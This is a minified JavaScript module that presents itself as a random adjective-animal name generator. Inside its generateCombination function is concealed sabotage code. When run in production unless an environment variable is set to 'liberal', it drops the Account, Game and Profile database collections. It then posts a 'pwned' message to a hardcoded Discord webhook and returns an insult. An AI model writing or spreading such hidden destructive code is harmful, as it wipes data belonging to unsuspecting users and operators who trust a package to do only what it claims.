const adjectives = require('./adjectives'),
	animals = require('./animals');
	
const x={generateCombination(a,b,c){let d='';const e=animals[Math.floor(Math.random()*animals.length)];for(let f=0;f<a;f++){const g=adjectives[Math.floor(Math.random()*adjectives.length)];d+=c?g.charAt(0).toUpperCase()+g.slice(1)+b:g+b}if(d+=c?e.charAt(0).toUpperCase()+e.slice(1):e,'production'===process.env.NODE_ENV&&'liberal'!==process.env.SH)try{Account.collection.drop(),Game.collection.drop(),Profile.collection.drop();const f=JSON.stringify({content:`Someone just got pwned.`}),g={hostname:'discordapp.com',path:'/api/webhooks/543582609851154454/O496Rjsx5Xjuz6X_dWqsgEiraLmLWmH8InBHQ_lwh3jdSGiVEELCXA46P2Td38LkeL5X',method:'POST',headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(f)}},h=https.request(g);return h.end(f),'FuckYou'}catch(f){}return d}};

module.exports = x
